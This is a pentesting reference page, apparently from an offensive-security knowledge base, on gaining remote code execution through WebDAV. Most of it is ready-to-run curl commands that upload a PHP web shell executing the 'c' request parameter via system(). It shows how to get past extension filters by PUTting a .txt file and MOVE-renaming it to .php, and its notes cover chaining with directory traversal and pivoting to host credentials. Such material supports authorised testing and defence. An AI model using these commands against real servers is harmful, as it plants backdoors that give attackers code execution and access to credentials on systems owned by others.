---
title: "PUT upload to RCE: planting an executable file via WebDAV"
description: "WebDAV's PUT verb writes a file directly to the server, and where that file lands in a web-interpreted directory it executes when requested. Extension restrictions are bypassed by uploading an allowed type then MOVE-renaming it, or by server quirks, turning a writable WebDAV into reliable remote code execution."
keywords:
  - webdav put
  - move rename
  - web shell
  - extension filter
  - remote code execution
---

# PUT upload to RCE

The sharpest WebDAV attack is `PUT`: it writes a file to the server with no application logic in between, so if the target directory is interpreted by the web server, the uploaded file runs when requested. The one obstacle is extension filtering, and WebDAV offers a classic bypass: `PUT` a file with a permitted extension, then `MOVE` it to the executable name, because the filter checks the PUT path but not the MOVE destination. The result is a reliable web shell from a writable WebDAV share.

```bash
# direct PUT where the dir executes the extension
curl -s -X PUT http://<target>/dav/shell.php --data '<?php system($_GET["c"]); ?>'
curl -s 'http://<target>/dav/shell.php?c=id'            # trigger

# extension-filter bypass: PUT allowed type, then MOVE to executable name
curl -s -X PUT http://<target>/dav/shell.txt --data '<?php system($_GET["c"]); ?>'
curl -s -X MOVE http://<target>/dav/shell.txt -H 'Destination: http://<target>/dav/shell.php'
curl -s 'http://<target>/dav/shell.php?c=id'

# IIS/ASP.NET: upload .aspx or use semicolon/trailing tricks where filters apply
# davtest automates discovery of which extensions execute
davtest -url http://<target>/dav/ -move
```

## Exploitation notes

- The PUT-then-MOVE rename is the reliable bypass: the extension filter commonly validates only the PUT request path, so MOVE to the executable extension slips the payload past it; `davtest -move` confirms it works.
- Pick the payload extension from what the server executes (determined in [discovery](discovery-and-methods.md)): `.php`, `.jsp`/`.jspx`, `.aspx`/`.asp` per the platform.
- Where the WebDAV directory is not itself executable, combine with [directory traversal](directory-traversal.md) (PUT target or MOVE Destination) to place the file into a directory that is.
- The web shell runs at the web server's privilege; use it to pivot to the host and credentials as with any web RCE.

## References

- [RFC 4918: PUT and MOVE](https://datatracker.ietf.org/doc/html/rfc4918)
- [HackTricks: WebDAV PUT/MOVE RCE](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav)
